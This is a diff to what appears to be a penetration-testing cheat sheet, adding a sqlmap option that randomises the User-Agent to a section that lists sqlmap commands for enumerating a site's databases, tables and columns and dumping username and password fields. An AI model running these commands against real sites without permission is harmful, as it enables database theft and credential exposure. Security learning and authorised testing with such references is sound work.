@@ -162,6 +162,7 @@
 ## 17. SQL Injection and Web Attacks
 
 - `sqlmap -u url-get-req --dbs`: Command to use sqlmap to find databases on a website.
+- `sqlmap -u url --random-agent -dbs`: This option tells sqlmap to use a random User-Agent string with each request.
 - `sqlmap -u url -D db-name --tables`: Command to use sqlmap to list tables in a specific database.
 - `sqlmap -u url -D db-name -T users --columns`: Command to use sqlmap to list columns in a specific table.
 - `sqlmap -u url -D db-name -T users -C uname,pass --dump`: Command to use sqlmap to dump data from specific columns in a table.
